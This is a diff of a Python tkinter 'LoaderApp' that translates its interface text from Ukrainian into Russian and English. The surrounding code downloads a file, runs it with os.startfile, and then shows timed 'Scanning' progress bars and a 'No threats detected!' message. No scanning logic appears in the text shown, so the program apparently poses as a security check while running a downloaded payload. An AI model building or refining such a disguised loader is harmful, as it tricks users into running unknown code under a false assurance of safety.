@@ -58,7 +58,7 @@ class LoaderApp:
         # ---------- ТЕКСТ ----------
         self.label = tk.Label(
             self.card,
-            text="🔄 Завантажую перевірку...",
+            text="🔄 Загрузка проверки...",
             bg=CARD,
             fg=TEXT,
             font=("Segoe UI", 12)
@@ -91,7 +91,7 @@ class LoaderApp:
         # ---------- СТАТУС ----------
         self.status = tk.Label(
             self.card,
-            text="⏳ Підготовка...",
+            text="⏳ Preparation...",
             bg=CARD,
             fg=SUB,
             font=("Segoe UI", 10)
@@ -106,7 +106,7 @@ class LoaderApp:
 
         threading.Thread(target=self.download).start()
 
-        self.run_bar(8, 15, "Завантаження")
+        self.run_bar(8, 15, "Loading")
 
         while not self.downloaded:
             time.sleep(0.2)
@@ -115,19 +115,19 @@ class LoaderApp:
             os.startfile(os.path.abspath(FILENAME))
             self.stage2()
         except:
-            self.label.config(text="❌ Помилка запуску")
+            self.label.config(text="❌ ERROR for startup")
 
 
     # ---------- ЕТАП 2 ----------
     def stage2(self):
 
         self.label.config(
-            text="📂 Починаю перевірку файлів..."
+            text="📂 I'm starting to check the files..."
         )
 
         self.progress["value"] = 0
 
-        self.run_bar(20, 30, "Сканування")
+        self.run_bar(20, 30, "Scanning")
 
         self.finish()
 
@@ -171,11 +171,11 @@ class LoaderApp:
     def finish(self):
 
         self.label.config(
-            text="✅ Загроз не знайдено!"
+            text="✅ No threats detected!"
         )
 
         self.status.config(
-            text="Натисніть будь-яку кнопку, щоб закрити програму"
+            text="Press any button to close the program"
         )
 
         # Слухаємо всі натискання
